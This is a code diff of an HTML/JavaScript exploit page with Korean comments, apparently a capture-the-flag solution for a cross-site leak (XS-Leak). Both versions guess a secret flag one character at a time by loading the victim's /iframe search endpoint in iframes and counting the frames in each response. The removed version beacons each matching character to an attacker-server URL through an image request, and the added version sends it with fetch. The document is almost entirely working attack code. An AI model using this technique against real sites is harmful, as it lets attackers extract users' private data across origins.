@@ -1,66 +1,22 @@
-<script>
-  const fl = "{{ flag }}";
-  const leakUrl = "{{ url }}"; // 공격자 서버에서 받는 엔드포인트
+<!DOCTYPE html>
+<body>
+    <script>
+      const flag = "{{ flag }}";
+      const chr_list = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','}'];
 
-  const charset = [
-    'a','b','c','d','e','f','g','h','i','j','k','l','m',
-    'n','o','p','q','r','s','t','u','v','w','x','y','z','}'
-  ];
+      for(let chr=0; chr<chr_list.length; chr++){
+        let start = performance.now();
+        const iframe = document.createElement("iframe");
+        iframe.src = `http://127.0.0.1:8000/iframe?query=${flag + chr_list[chr]}`;
 
-  charset.forEach((chr) => {
-    // 1) iframe 생성 + 이름 부여
-    const iframe = document.createElement("iframe");
-    const frameName = "probe_" + chr; // 각 문자별 고유 이름
-    iframe.name = frameName;
-    document.body.appendChild(iframe);
+        iframe.onload = () => {
+            const frameCount = iframe.contentWindow.length;
+            if(frameCount >= 1){
+                fetch('/?flag='+chr_list[chr])
+            }
+        };
 
-    // 2) onload 핸들러: 응답이 로드된 뒤 frameCount 측정
-    iframe.onload = () => {
-      let frameCount;
-
-      try {
-        // 같은 오리진이라고 가정 (XS-Leak 실습 환경)
-        frameCount = iframe.contentWindow.length; // = iframe.contentWindow.frames.length
-      } catch (e) {
-        cleanup();
-        return;
+        document.body.appendChild(iframe);
       }
-
-      // 🔹 프레임 수가 1 이상이면 공격자 서버로 문자 전송
-      if (frameCount >= 1) {
-        const img = new Image();
-        img.src = leakUrl + `?flag=${encodeURIComponent(chr)}`;
-      }
-
-      cleanup();
-    };
-
-    // 3) POST용 form 생성
-    const form = document.createElement("form");
-    form.method = "POST";
-    form.action = "/iframe";      // 피해자 서버의 /iframe (POST 받는 엔드포인트)
-    form.target = frameName;      // 이 폼의 응답을 위에서 만든 iframe으로 로드
-
-    // 4) query 파라미터 입력값 (hidden input)
-    const input = document.createElement("input");
-    input.type = "hidden";
-    input.name = "query";         // 서버에서 request.form.get("query") 로 받는 이름
-    input.value = fl + chr;       // 필터링할 문자열 (브라우저가 알아서 url-encode함)
-
-    form.appendChild(input);
-    document.body.appendChild(form);
-
-    // 5) 폼 제출 → iframe으로 POST 요청 전송
-    form.submit();
-
-    // 6) 정리 함수
-    function cleanup() {
-      try {
-        document.body.removeChild(iframe);
-      } catch (e) {}
-      try {
-        document.body.removeChild(form);
-      } catch (e) {}
-    }
-  });
-</script>
+    </script>
+</body>
